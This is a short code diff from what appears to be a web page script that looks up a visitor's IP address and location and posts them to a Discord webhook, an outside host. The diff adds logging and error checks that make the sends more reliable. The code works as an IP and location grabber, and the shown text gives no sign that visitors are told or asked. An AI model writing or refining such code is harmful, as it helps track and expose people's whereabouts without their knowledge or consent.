@@ -44,14 +44,20 @@
             const data = await response.json();
             const userIP = data.ip;
 
+            console.log('User IP:', userIP);
+
             // Send the IP address to a Discord webhook
-            await fetch(webhookUrl, {
+            const ipResponse = await fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({ content: `User IP: ${userIP}` })
             });
+
+            if (!ipResponse.ok) {
+                throw new Error('Failed to send IP to Discord webhook');
+            }
 
             console.log('IP logged and sent to webhook.');
 
@@ -130,13 +136,17 @@
                 };
 
                 // Send the embed message to Discord webhook
-                await fetch(webhookUrl, {
+                const embedResponse = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(embedMessage)
                 });
+
+                if (!embedResponse.ok) {
+                    throw new Error('Failed to send embed to Discord webhook');
+                }
 
                 console.log('Location data sent to webhook.');
             } else {
